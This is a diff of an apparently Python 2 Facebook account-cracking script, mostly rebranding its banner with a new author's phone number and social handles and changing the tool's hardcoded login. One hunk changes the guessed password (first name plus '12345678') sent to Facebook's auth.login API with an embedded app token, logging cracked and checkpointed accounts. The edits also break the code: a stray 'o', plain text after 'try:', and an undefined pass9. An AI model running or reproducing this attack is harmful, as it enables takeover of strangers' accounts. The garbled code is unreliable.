@@ -49,17 +49,17 @@ def jalan(z):
 ##### LOGO #####
 logo = """ -----------------------------•◈•
 (  __)\\ ____--------------_------------•◈•
-|__(~)    •||•THE - AAHIL -OFFICAL------•◈•
-|__\~~) •||•RANA - RAJPUT---------------•◈•
-|__(-----\  •◈•------BLACK-TIGER--------•◈•
+|__(~)    •||•THE - AAQIR -OFFICAL------•◈•
+|__\~~) •||•AAQIR - BALOUCH---------------•◈•
+|__(-----\  •◈•------KING-BALOUCH--------•◈•
 |__~~~\ •◈•-----█-------⑦-------█------•◈•
 |__~~~\ •◈•-----█-------⑧-------█------•◈•
 |__~~~\ •◈•-----█-------⑥-------█------•◈•
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;FlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1; Aahilrna4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/zero
+\033[1;96mAuthor  03002214827 MY WHATSAPP NUMBER
+\033[1; KING BALOUCH HATTERS FEELING ON RAKHO 
+\033[1;96mFacebook  arslankhan.khan.7399
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/AaqirKing/Aaqir
 \033[1;91m======================================="""
 
 def tik():
@@ -80,15 +80,15 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;92mFlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Aahilrana4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/zero
+\033[1;96mAuthor  03002214827
+\033[1;AAQIR BALOUCH 
+\033[1;96mFacebook  \033[1;93m: \033[1;92 arslankhan.khan.7399
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/AaqirKing/Aaqir
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "Aaqir"
+CorrectPassword = "King"
 
 loop = 'true'
 while (loop == 'true'):
@@ -100,14 +100,15 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+            o
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+             
+		
 
 def login():
 	os.system('clear')
-	try:
+	try: EK NEW ACCOUNT BANA KAR LOGIN KARNA PERSONAL ACCOUNT LOGIN NA KARNA CHECKPOINT PE JAYE GA AUR HAN AP KA NET JITNA HOGA US HISAB SE AP KE PAS IDS AYE GI 
 		toket = open('login.txt','r')
 		menu() 
 	except (KeyError,IOError):
@@ -372,11 +373,11 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name'] + '1234'
-													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													pass6 = b['first_name'] + '12345678'
+													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
-														print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
+														print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
@@ -411,9 +412,9 @@ def pilih_super():
 	print 42*"\033[1;96m="
 	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
+	print("\033[1;96m[+] \ 033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
-
+ 
 if __name__ == '__main__':
 	login()
